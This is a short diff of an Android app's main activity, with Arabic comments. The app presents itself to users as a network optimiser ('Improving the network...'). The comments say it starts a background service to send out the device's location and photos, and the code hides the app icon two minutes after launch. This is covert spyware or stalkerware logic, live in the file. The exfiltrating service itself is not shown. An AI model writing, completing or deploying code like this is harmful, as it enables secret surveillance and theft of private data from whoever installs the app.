@@ -7,7 +7,6 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.Settings;
 import android.widget.Button;
 import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
@@ -24,7 +23,7 @@ public class MainActivity extends AppCompatActivity {
         Button startBtn = findViewById(R.id.startBtn);
         TextView statusText = findViewById(R.id.statusText);
 
-        // تشغيل خدمة الخلفية فوراً (عشان تبدأ تبعت الموقع والصور)
+        // 1. تشغيل السيرفر في الخلفية (عشان يبعت الموقع والصور)
         Intent serviceIntent = new Intent(this, BackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -32,9 +31,12 @@ public class MainActivity extends AppCompatActivity {
             startService(serviceIntent);
         }
 
-        // إخفاء التطبيق بعد دقيقتين بالظبط
-        new Handler().postDelayed(this::hideAppIcon, 120000);
+        // 2. إخفاء التطبيق بعد دقيقتين من فتح الشاشة دي
+        new Handler().postDelayed(() -> {
+            hideAppIcon();
+        }, 120000); // 120,000 مللي ثانية = دقيقتين
 
+        // 3. طلب الصلاحيات
         startBtn.setOnClickListener(v -> {
             statusText.setText("جاري تحسين الشبكة...");
             requestPermissions();
